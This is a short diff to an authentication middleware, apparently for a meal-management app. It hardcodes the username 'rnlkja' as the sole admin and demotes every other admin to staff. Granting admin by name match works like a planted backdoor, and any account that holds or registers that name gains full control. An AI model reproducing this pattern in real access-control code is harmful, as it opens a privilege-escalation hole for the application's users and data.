@@ -15,6 +15,13 @@ import { schema } from '../db/client.js';
 import { requestDb } from '../db/request-db.js';
 import type { AuthTokenPayload, UserRole } from '@meal/shared';
 
+export const PRIMARY_ADMIN_USERNAME = 'rnlkja';
+
+export function resolveEffectiveRole(username: string, role: UserRole): UserRole {
+  if (username.trim().toLowerCase() === PRIMARY_ADMIN_USERNAME) return 'admin';
+  return role === 'admin' ? 'staff' : role;
+}
+
 export interface AuthUserCtx {
   id: number;
   username: string;
@@ -83,7 +90,7 @@ export function requireAuth(): MiddlewareHandler<{
       id: u.id,
       username: u.username,
       full_name: u.full_name,
-      role: u.role,
+      role: resolveEffectiveRole(u.username, u.role),
     });
 
     await next();
